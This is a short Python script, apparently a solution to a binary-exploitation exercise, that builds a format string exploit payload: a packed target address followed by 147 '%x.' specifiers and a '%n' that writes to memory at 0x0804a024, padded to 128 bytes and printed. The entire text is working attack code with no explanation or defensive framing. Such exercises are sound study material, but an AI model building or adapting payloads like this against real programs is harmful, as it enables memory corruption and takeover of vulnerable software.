import struct
exploit = "AAAA"
exploit += struct.pack("I", 0x0804a024)
exploit += "BB"
exploit += "%x."*147
exploit += "%n"
padding = "X"*(128-len(exploit))
print (exploit+padding)
